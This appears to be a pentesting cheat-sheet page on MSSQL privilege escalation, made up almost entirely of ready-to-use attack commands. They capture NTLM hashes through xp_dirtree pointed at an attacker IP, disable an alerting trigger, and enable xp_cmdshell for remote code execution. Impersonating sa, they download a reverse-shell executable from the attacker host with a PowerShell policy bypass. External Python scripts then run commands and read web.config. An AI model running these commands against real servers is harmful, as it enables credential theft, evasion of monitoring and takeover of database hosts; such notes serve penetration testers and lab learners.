---
title: "MSSQL Privilege Escalation"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "exploit", "rce", "privilege escalation", "pe"]
---

---
#### Steal NTLM hash

```bash
# In our local Linux machine
sudo responder -I tun0
```

```mysql
# Inside mssql terminal
xp_dirtree '\\10.10.14.10\any\thing';
```

#### Run xp_cmdshell

```mysql
# Check any policy blocking xp_cmdshell
select name from sys.server_triggers;

# Disable trigger if any
disable trigger ALERT_xp_cmdshell on all server;

# Enable xp_cmdshell
enable_xp_cmdshell;

# RCE
xp_cmdshell whoami
```

#### Impersonate sa to run xp_cmdshell

```mysql
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
execute as login = 'sa'; reconfigure;
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
execute as login = 'sa'; reconfigure;
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe'
```

#### Run External Script

```mysql
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
```

<br>